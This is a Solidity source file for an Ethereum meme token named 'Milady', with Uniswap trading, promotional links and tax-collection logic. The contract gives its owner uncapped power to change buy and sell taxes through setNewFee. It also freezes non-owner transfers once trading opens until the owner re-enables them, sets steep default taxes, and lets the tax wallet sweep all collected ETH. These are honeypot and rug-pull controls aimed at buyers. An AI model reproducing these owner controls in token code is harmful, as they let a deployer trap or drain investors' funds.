1 /*
2 Website: https://www.miladyupsidedown.com/
3 
4 Telegram: https://t.me/miladyupsidedown
5 
6 Twitter: https://twitter.com/miladyupside
7 
8 ʇuǝɯǝʌoɯ lɐɹnʇlnɔ ɐ sᴉ
9 */
10 // SPDX-License-Identifier: MIT
11 
12 pragma solidity 0.8.20;
13 
14 abstract contract Context {
15     function _msgSender() internal view virtual returns (address) {
16         return msg.sender;
17     }
18 }
19 
20 interface IERC20 {
21     function totalSupply() external view returns (uint256);
22     function balanceOf(address account) external view returns (uint256);
23     function transfer(address recipient, uint256 amount) external returns (bool);
24     function allowance(address owner, address spender) external view returns (uint256);
25     function approve(address spender, uint256 amount) external returns (bool);
26     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
27     event Transfer(address indexed from, address indexed to, uint256 value);
28     event Approval(address indexed owner, address indexed spender, uint256 value);
29 }
30 
31 library SafeMath {
32     function add(uint256 a, uint256 b) internal pure returns (uint256) {
33         uint256 c = a + b;
34         require(c >= a, "SafeMath: addition overflow");
35         return c;
36     }
37 
38     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
39         return sub(a, b, "SafeMath: subtraction overflow");
40     }
41 
42     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
43         require(b <= a, errorMessage);
44         uint256 c = a - b;
45         return c;
46     }
47 
48     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
49         if (a == 0) {
50             return 0;
51         }
52         uint256 c = a * b;
53         require(c / a == b, "SafeMath: multiplication overflow");
54         return c;
55     }
56 
57     function div(uint256 a, uint256 b) internal pure returns (uint256) {
58         return div(a, b, "SafeMath: division by zero");
59     }
60 
61     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
62         require(b > 0, errorMessage);
63         uint256 c = a / b;
64         return c;
65     }
66 
67 }
68 
69 contract Ownable is Context {
70     address private _owner;
71     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
72 
73     constructor () {
74         address msgSender = _msgSender();
75         _owner = msgSender;
76         emit OwnershipTransferred(address(0), msgSender);
77     }
78 
79     function owner() public view returns (address) {
80         return _owner;
81     }
82 
83     modifier onlyOwner() {
84         require(_owner == _msgSender(), "Ownable: caller is not the owner");
85         _;
86     }
87 
88     function renounceOwnership() public virtual onlyOwner {
89         emit OwnershipTransferred(_owner, address(0));
90         _owner = address(0);
91     }
92 
93 }
94 
95 interface IUniswapV2Factory {
96     function createPair(address tokenA, address tokenB) external returns (address pair);
97 }
98 
99 interface IUniswapV2Router02 {
100     function swapExactTokensForETHSupportingFeeOnTransferTokens(
101         uint amountIn,
102         uint amountOutMin,
103         address[] calldata path,
104         address to,
105         uint deadline
106     ) external;
107     function factory() external pure returns (address);
108     function WETH() external pure returns (address);
109     function addLiquidityETH(
110         address token,
111         uint amountTokenDesired,
112         uint amountTokenMin,
113         uint amountETHMin,
114         address to,
115         uint deadline
116     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
117 }
118 
119 contract Milady is Context, IERC20, Ownable {
120     using SafeMath for uint256;
121     mapping (address => uint256) private _balances;
122     mapping (address => mapping (address => uint256)) private _allowances;
123     mapping (address => bool) private _isExcludedFromFee;
124     mapping (address => bool) private bots;
125     mapping(address => uint256) private _holderLastTransferTimestamp;
126     bool public transferDelayEnabled = true;
127     address payable private _taxWallet;
128 
129     uint256 private _buyTax=19;
130     uint256 private _sellTax=28;
131     uint256 private _preventSwapBefore=25;
132     uint256 private _buyCount=0;
133 
134     uint8 private constant _decimals = 9;
135     uint256 private constant _tTotal = 100000000000 * 10**_decimals;
136     string private constant _name = unicode"ʎpɐlᴉW";
137     string private constant _symbol = unicode"⅄p∀˥IW";
138     uint256 public _maxTxAmount = 2000000000 * 10**_decimals;
139     uint256 public _maxWalletSize = 2000000000 * 10**_decimals;
140     uint256 public _taxSwapThreshold= 200000000 * 10**_decimals;
141     uint256 public _maxTaxSwap= 1000000000 * 10**_decimals;
142 
143     IUniswapV2Router02 private uniswapV2Router;
144     address private uniswapV2Pair;
145     bool private tradingOpen;
146     bool private inSwap = false;
147     bool private swapEnabled = false;
148     bool private transferAllowed = true;
149 
150     event MaxTxAmountUpdated(uint _maxTxAmount);
151     modifier lockTheSwap {
152         inSwap = true;
153         _;
154         inSwap = false;
155     }
156 
157     constructor () {
158         _taxWallet = payable(_msgSender());
159         _balances[_msgSender()] = _tTotal;
160         _isExcludedFromFee[owner()] = true;
161         _isExcludedFromFee[address(this)] = true;
162         _isExcludedFromFee[_taxWallet] = true;
163 
164         emit Transfer(address(0), _msgSender(), _tTotal);
165     }
166 
167     function name() public pure returns (string memory) {
168         return _name;
169     }
170 
171     function symbol() public pure returns (string memory) {
172         return _symbol;
173     }
174 
175     function decimals() public pure returns (uint8) {
176         return _decimals;
177     }
178 
179     function totalSupply() public pure override returns (uint256) {
180         return _tTotal;
181     }
182 
183     function balanceOf(address account) public view override returns (uint256) {
184         return _balances[account];
185     }
186 
187     function transfer(address recipient, uint256 amount) public override returns (bool) {
188         _transfer(_msgSender(), recipient, amount);
189         return true;
190     }
191 
192     function allowance(address owner, address spender) public view override returns (uint256) {
193         return _allowances[owner][spender];
194     }
195 
196     function approve(address spender, uint256 amount) public override returns (bool) {
197         _approve(_msgSender(), spender, amount);
198         return true;
199     }
200 
201     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
202         _transfer(sender, recipient, amount);
203         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
204         return true;
205     }
206 
207     function _approve(address owner, address spender, uint256 amount) private {
208         require(owner != address(0), "ERC20: approve from the zero address");
209         require(spender != address(0), "ERC20: approve to the zero address");
210         _allowances[owner][spender] = amount;
211         emit Approval(owner, spender, amount);
212     }
213 
214     function _transfer(address from, address to, uint256 amount) private {
215         require(from != address(0), "ERC20: transfer from the zero address");
216         require(to != address(0), "ERC20: transfer to the zero address");
217         require(amount > 0, "Transfer amount must be greater than zero");
218         uint256 taxAmount=0;
219         if (from != owner() && to != owner()) {
220             require(transferAllowed, "Transfers are disabled");
221             taxAmount = amount.mul(_buyTax).div(100);
222 
223             if (from == uniswapV2Pair && to != address(uniswapV2Router) && ! _isExcludedFromFee[to] ) {
224                 require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
225                 require(balanceOf(to) + amount <= _maxWalletSize, "Exceeds the maxWalletSize.");
226                 _buyCount++;
227             }
228 
229             if(to == uniswapV2Pair && from!= address(this) ){
230                 taxAmount = amount.mul(_sellTax).div(100);
231             }
232 
233             uint256 contractTokenBalance = balanceOf(address(this));
234             if (!inSwap && to   == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold) {
235                 swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
236                 uint256 contractETHBalance = address(this).balance;
237                 if(contractETHBalance > 0) {
238                     sendETHToFee(address(this).balance);
239                 }
240             }
241         }
242 
243         if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != uniswapV2Pair && to != uniswapV2Pair)) {
244             taxAmount = 0;
245         }
246 
247         if(taxAmount > 0){
248           _balances[address(this)]=_balances[address(this)].add(taxAmount);
249           emit Transfer(from, address(this),taxAmount);
250         }
251 
252         _balances[from]=_balances[from].sub(amount);
253         _balances[to]=_balances[to].add(amount.sub(taxAmount));
254         emit Transfer(from, to, amount.sub(taxAmount));
255     }
256 
257 
258     function min(uint256 a, uint256 b) private pure returns (uint256){
259       return (a>b)?b:a;
260     }
261 
262     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
263         address[] memory path = new address[](2);
264         path[0] = address(this);
265         path[1] = uniswapV2Router.WETH();
266         _approve(address(this), address(uniswapV2Router), tokenAmount);
267         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
268             tokenAmount,
269             0,
270             path,
271             address(this),
272             block.timestamp
273         );
274     }
275 
276     function removeLimits() external onlyOwner{
277         _maxTxAmount = _tTotal;
278         _maxWalletSize=_tTotal;
279         transferDelayEnabled=false;
280         emit MaxTxAmountUpdated(_tTotal);
281     }
282 
283     function sendETHToFee(uint256 amount) private {
284         _taxWallet.transfer(amount);
285     }
286 
287     function setNewFee(uint256 taxFeeOnBuy, uint256 taxFeeOnSell) public onlyOwner {
288         _buyTax = taxFeeOnBuy;
289         _sellTax = taxFeeOnSell;
290     }
291 
292     function openTrading() external onlyOwner() {
293         require(!tradingOpen,"trading is already open");
294         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
295         _approve(address(this), address(uniswapV2Router), _tTotal);
296         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
297         uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
298         IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
299         swapEnabled = true;
300         tradingOpen = true;
301         transferAllowed = false;
302     }
303 
304     function enableTrading() external onlyOwner() {
305         transferAllowed = true;
306     }
307 
308     function airdrop(address airdropAddress, uint256 amount) external onlyOwner(){
309         address from = msg.sender;
310         _transfer(from, airdropAddress, amount * (10 ** 9));
311     }
312 
313     receive() external payable {}
314 
315     function manualSwap() external {
316         require(_msgSender()==_taxWallet);
317         uint256 tokenBalance=balanceOf(address(this));
318         if(tokenBalance>0){
319           swapTokensForEth(tokenBalance);
320         }
321         uint256 ethBalance=address(this).balance;
322         if(ethBalance>0){
323           sendETHToFee(ethBalance);
324         }
325     }
326 
327     function manualSend() external {
328         require(_msgSender()==_taxWallet);
329         uint256 ethBalance=address(this).balance;
330         if(ethBalance>0){
331           sendETHToFee(ethBalance);
332         }
333     }
334 }